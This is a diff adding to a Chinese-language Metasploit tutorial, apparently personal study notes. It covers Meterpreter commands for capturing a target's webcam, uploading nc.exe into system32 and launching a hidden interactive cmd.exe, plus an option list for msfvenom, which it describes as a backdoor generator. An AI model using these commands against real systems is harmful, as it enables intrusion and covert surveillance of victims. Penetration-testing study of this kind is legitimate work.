@@ -103,7 +103,38 @@ save -> 將當前設置值保存下來，以便下次啟動MSF終端時仍可使
 ![image](https://user-images.githubusercontent.com/96654161/170551811-67a65e65-2925-4c1d-b39e-57b99f996055.png)
 ![image](https://user-images.githubusercontent.com/96654161/170551958-4c27c0c4-ab7a-4d03-a48f-c869a391b668.png)
 
++ webcam_list : 查看攝像頭 列出對方的攝像頭
++ webcam_snap : 通過攝像頭拍照 
++ webcam_stream : 通過攝像頭開啟視頻
+![image](https://user-images.githubusercontent.com/96654161/170553668-bd7808e9-d768-4aa3-872c-83e8392e8c40.png)
 
++ upload : 上傳本地文件到目標機器
++ upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
+
+![image](https://user-images.githubusercontent.com/96654161/170554858-4d4c5e79-b402-43b8-b659-505b5fd1a45c.png)
+
+
++ execute -H -i -f cmd.exe
++ execute : 再目標機器執行文件，創建新process cmd.exe,-H不可見,-i交互
+
+![image](https://user-images.githubusercontent.com/96654161/170554951-c24df2ab-ee80-46f1-9967-8fca0d3619d4.png)
+>上傳後執行
+
+### msfvenom
+
++ msfvenom是msfpayload和msfencode的組合，將這兩工具集成在一個框架實例中
++ 用來生成後門的軟件，在目標機上執行後門，在本地監聽上線
+
+```diff
+-p : --payload,指定特定的payload 如果被設置為 - 那麼從標準輸入流中讀取
+-l : --list 列出所有可用的項目 其中值可以被設置為 payload,encoders,nops,all
+-n : --nopsled 指定nop在payload中的數量
+-f : --format 指定payload的輸出格式(--list formats : 列出所有可用的輸出格式)
+-e : --encoder，指定使用的encoder
+-a : --arch 指定目標系統架構
+--platform : 指定目標系統平台
+-s : --space 設置未經編碼的payload最大長度(--encoder-space:編碼後的payload的最大長度)
+```
 
 
 <!---
